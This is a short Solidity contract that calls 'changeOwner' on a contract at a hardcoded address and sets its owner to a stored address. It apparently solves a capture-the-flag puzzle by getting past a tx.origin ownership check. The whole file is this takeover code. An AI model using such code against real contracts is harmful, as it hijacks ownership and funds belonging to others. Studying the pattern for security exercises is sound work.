// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface IOwner {
    function changeOwner(address _owner) external;
}

contract TeleCall {
    address myAddress = 0x1FDD0F41CA594B5518D3DE33AEdF0a41e24Ec8d6;

    function setOwner() public {
        IOwner(0xb8486F57A3907c49F5D8aC730aF8A1e9A0a1a410).changeOwner(
            myAddress
        );
    }
}
